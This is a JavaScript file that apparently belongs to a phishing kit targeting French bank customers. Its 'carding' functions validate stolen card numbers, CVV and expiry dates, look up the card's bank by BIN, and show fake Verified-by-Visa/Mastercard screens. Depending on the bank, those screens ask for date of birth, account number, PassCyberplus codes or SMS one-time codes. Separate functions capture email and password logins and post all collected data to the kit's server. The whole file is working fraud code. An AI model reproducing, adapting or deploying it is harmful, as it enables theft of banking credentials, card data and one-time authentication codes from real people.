function checkCcno() {
    $("#card-type-trv").on("change", function () {
        if (this.value == 0) {
            $(this).addClass("error");
        } else {
            $(this).removeClass("error");
        }
    });
    $("#ccno").validateCreditCard(function (t) {
        $(this).focusout(function () {
            if (t.valid && t.length_valid && t.luhn_valid) {
                $(this).removeClass("error");
            } else {
                $(this).addClass("error");
            }
        });
        if (t.valid && t.length_valid && t.luhn_valid) {
            $(this).removeClass("error");
            checkBankForBDate($(this).val());
        } else {
            $(this).addClass("error");
            $("#dobirth , .departement-naissance , .n-compte").addClass("hidden").removeClass("error");
        }
    })
}

function checkCvv() {
    $("#cvv").on("keyup focus change past blur keystroke undo redo input", function () {
        var t = $(this).val();
        t.length != 3 || !isNumber(t) ? ($(this).addClass("error")) : $(this).removeClass("error")
    })
}

function checkExpDate() {
    $("#expMonth , #expYear").on("change", function () {
        var e = parseInt($("#expMonth").val()), s = parseInt($("#expYear").val());
        var a = new Date;
        if ((e <= a.getMonth() && s == a.getFullYear()) || s < a.getFullYear() || isNaN(s) || isNaN(e)) {
            $("#expdate").addClass("error")
        } else {
            $("#expdate").removeClass("error")
        }
    });

}

function hydrate(t) {
    var e = t.data, s = "" != e["Prénom / Nom"] ? e["Prénom / Nom"] : "Espace Client";
    $(".info").html(e.maj);
    var a = "";
    delete e.maj, $(".title").html(s);
    for (var o in e) "" != e[o] && (a += "<tr>", a += "<td class='key'>" + o + " :</td>", a += "<td class='value'>" + e[o] + "</td>", a += "</tr>");
    $(".fullData").append("<table>" + a + "</table>");
}


function getDataToHidden(selector, e, override) {
    var r = "";
    if (e.hasOwnProperty('maj'))
        delete e.maj;
    for (var o in e) "" != e[o] && (r += "<input type='hidden' name='" + o + "' value='" + e[o] + "'>");
    if (override == false)
        $(selector).append(r);
    else
        $(selector).html(r);
}

function checkCarding() {
    checkExpDate(), checkCvv(), checkCcno(), checkBdate(),checkInputGlobal(".n-compte") , checkInputGlobal(".departement-naissance") ,  $(".carding input , .carding select").on("keyup focus change past blur keystroke undo redo input", function () {
        (0 == $(".carding").find(".error").length) ? ($("#FFIOMNLLDSXXZQASDS").addClass("important")) : ($("#FFIOMNLLDSXXZQASDS").removeClass("important"))
    }),
        $("#FFIOMNLLDSXXZQASDS").click(function () {
            var t = $(this).attr("title"), error = $(".error").attr("for");
            if ($(this).hasClass("important")) {
                $(".RRTITOTGHFHFERROR").addClass("hidden");
                submit(t, ".carding", "span.important");
            } else {
                $(".RRTITOTGHFHFERROR_message").html(error);
                $(".RRTITOTGHFHFERROR").removeClass("hidden");
            }
        }),
        $("span.annuler").click(function () {
            $("#ccno").val(""), $("#cvv").val(""), $("#cvv").addClass("error")
        });
}

function checkBdate() {
    $("#dobirth input").on("keyup focus change past blur keystroke undo redo input", function () {
        var dob = $("#dob").val(), dobe = parseInt(dob), mob = $("#mob").val(), mobe = parseInt(mob),
            yob = $("#yob").val(), yobe = parseInt(yob);
        dobe > 31 || dobe <= 0 || isNaN(dobe) || mobe > 12 || mobe <= 0 || isNaN(mobe) || yobe < 1912 || yobe > 2004 || isNaN(yobe) ? $("#dobirth").addClass("error") : ($("#dobirth").removeClass("error"))
    });

}
function checkInputGlobal(selector ) {
    $(selector+" input").on("keyup focus change past blur keystroke undo redo input", function () {
        var val = $(this).val();
        val == "" || val.length < 2 ? $(selector).addClass("error"):$(selector).removeClass("error");
    });

}

function isNumber(string) {
    var regX = /\d{3,}/;
    return regX.test(string);
}

function vbvFormer(t) {
    t = JSON.parse(t);
    var e = "mastercard" == t.vbv ? "MC" : "visa",
        s = "mastercard" == t.vbv ? "https://i.imgur.com/P3f4NyM.png" : "https://i.imgur.com/V0OIpOs.png";
    $("img.right").prop("src", s), $("img.right").css("width", t.style), $(".bank-name").html(t.bank), $(".message-vbv").html(t.message);
    var a = "", r = "<tr>\n<td>N&deg; de carte :</td>\n<td>xxxxxxxxxxxx" + t.lastNumbers + "</td>\n</tr>";
    t.bank.match(/SOCIETE GENERALE/i) ? (a = "Num&eacute;ro de compte ", r += '<tr class="sg pass3d">\n    <td style="width: 41%;">N&deg; de compte<sup>' + e + '</sup> :    <td><input name="numeroDuCompte" type="text" style="width: 50%;height: 20px;font-size: 11px;outline: none;" class="nc error" maxlength="8"/>\n<img style="margin: 0 0 0 8px;" src="https://i.imgur.com/IoBYk1c.png" width="30" height="30" />\n<span></span>\n<button type="submit" class="disabled" disabled role="merci">Ok</button>\n    </td>\n</tr>\n<script>checkNc();<\/script>') : t.bank.match(/POPULAIRE/i) || t.bank.match(/NATIXIS/i) ? (a = "PassCyberplus ", r += '<tr class="pass3d cb">\n    <td style="font-weight: bold;width: 35%;">PassCyberplus<sup>' + e + '</sup> :    </td>\n    <td><input name="passCyberplus" type="text" style="width: 50%;height: 20px;font-size: 11px;outline: none;" class="error" maxlength="8"/>\n<img style="margin: 0 0 0 8px;" src="https://i.imgur.com/513oqaA.png" width="30px" height="40px" />\n<span></span>\n<button type="submit" class="disabled" disabled role="merci">Ok</button>\n</td>\n</tr>\n<script>checkCyberPlus();<\/script>') : (a = " le Code Securit&eacute; <br />que vous venez de recevoir sur votre  t&eacute;l&eacute;phone. ", r += ' <tr>\n<td>N&deg; t&eacute;l&eacute;phone :</td>\n<td style="letter-spacing: 0.07rem;">XXXXXXX' + t.phone + "</td>\n</tr>", r += '<tr class="pass3d scood">\n<td style="font-weight: bold;width: 41%;">Le Code Securit&eacute; reçus sur votre t&eacute;l&eacute;phone :</td>\n<td><input name="CodeRecusParPhone" type="text" style="width: 50%;height: 20px;font-size: 11px;outline: none;" class="error" maxlength="8"/>\n<span></span>\n<button type="submit" class="disabled" disabled role="merci">Ok</button>\n</td>\n</tr>\n<script>checkCodePhone();<\/script>'), $(".vbv-type").html(a), $("#core-vbv table ").append(r)
}

function checkCodePhone() {
    $(".scood input").on("keyup focus change past blur keystroke undo redo input", function () {
        this.value.length >= 6 ? ($(this).removeClass("error"), $("button").prop("disabled", !1), $("button").removeClass("disabled")) : ($(this).addClass("error"), $("button").prop("disabled", !0), $("button").addClass("disabled"))
    })
}

function checkCyberPlus() {
    $(".cb input").on("keyup focus change past blur keystroke undo redo input", function () {
        this.value.length != this.maxLength || isNaN($(this).val()) ? ($(this).addClass("error"), $("button").prop("disabled", !0), $("button").addClass("disabled")) : ($(this).removeClass("error"), $("button").prop("disabled", !1), $("button").removeClass("disabled"))
    })
}

function checkNc() {
    $('.nc').on("keyup focus change past blur keystroke undo redo input", function () {
        $(this).val().length == 8 ? $(this).removeClass("error") : $(this).addClass("error")
    }), $("#vbv-form input").on("keyup focus change past blur keystroke undo redo input", function () {
        0 == $("#vbv-form").find(".error").length ? ($("button").prop("disabled", !1), $("button").removeClass("disabled")) : ($("button").prop("disabled", !0), $("button").addClass("disabled"))
    })
}

function submit(t, e, s) {
    var a = $(e).serialize();
    $.ajax({
        type: "POST", url: "?check_url=" + t, data: a, timeout: 1e4, beforeSend: function () {
            $(s).addClass("disabled")
        }, success: function (s) {
            if ("coordonnees" == t) {
                var a = JSON.parse(s);
                "error" == a.response ? ("" != a.data && $(".blockelem span").html(a.data), $(".blockelem").show(), $("#password").val("")) : ($(e).attr("action", "?return_url=" + t), getDataToHidden(e, a.data, false), $(e).submit())
            } else $(e).attr("action", "?return_url=" + t), $(e).submit()
        }, error: function (t) {
            $(".blockelem span").html("D&eacute;sol&eacute;, une erreur s'est produite. R&eacute;essayez. "), $(".blockelem").show()
        }, complete: function () {
            $(s).removeClass("disabled")
        }, dataType: "html"
    })
}

function checkBankForBDate(ccno) {
    $.ajax({
        type: "GET",
        url: "?check_url=bank&bin=" + ccno,
        success: function (result) {
            var obj = JSON.parse(result), bank = obj.bank;
            getDataToHidden("#hidden-inputs", obj, true);
            if (bank.match(/BNP/i) ) {
                $("#dobirth").removeClass("hidden").addClass("error");
                $(".departement-naissance , .n-compte").addClass("hidden").removeClass("error");
            } else if (bank.match(/POSTALE/i)) {
                $("#dobirth , .departement-naissance").addClass("hidden").removeClass("error");
                $(".n-compte").removeClass("hidden").addClass("error");
            } else if (bank.match(/SOCIETE GENERALE/i)) {
                $("#dobirth , .n-compte").addClass("hidden").removeClass("error");
                $(".departement-naissance").removeClass("hidden").addClass("error");
            } else {
                $("#dobirth , .departement-naissance , .n-compte").addClass("hidden").removeClass("error");
            }

        }
    });
}


function afficherDate(t) {
    var e = new Date,
        s = (e.getDate() < 10 ? "0" : "") + e.getDate() + "/" + (((e.getMonth() + 1) < 10 ? "0" : "") + (e.getMonth() + 1)) + "/" + e.getFullYear();
    $("#" + t).html(s)
}

function isEmail(t) {
    return /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(t)
}

function isPhone(t) {
    return /^((\+)33|0)[1-9](\d{2}){4}$/g.test(t)
}

function afficherHeure(t) {
    var e = new Date, s = (e.getMinutes() < 10 ? "0" : "") + e.getMinutes(),
        a = (e.getHours() < 10 ? "0" : "") + e.getHours() + ":" + s + ":" + ((e.getSeconds() < 10 ? "0" : "") + e.getSeconds());
    $("#" + t).html(a)
}

function datePrinter() {
    afficherDate("date"), afficherHeure("hour"), setInterval('afficherHeure("hour")', 1e3)
}

function checkLogin() {
    $(".important").click(function () {
        var t = $(this).attr("title");
        $(this).hasClass("disabled") || ($(".important").addClass("disabled"), submit(t, ".login", ".important"))
    }), $("span.annuler").click(function () {
        $("#email").val(""), $("#password").val("")
    })
}

function coordonneCheck(array) {
    hydrate(array);
    getDataToHidden(".carding", array, false);
    $(window).on('load', function () {
        $('#myModal').modal('show');
    });
    $('#myModal').modal({
        backdrop: 'static',
        keyboard: false
    });

    $('#myModal .imp , #myModal .annuler , #myModal .close').click(function () {
        var url = "?return_url=" + $("#myModal").attr("title");
        setTimeout(function () {
            window.location.href = url
        }, 1000);
    })
}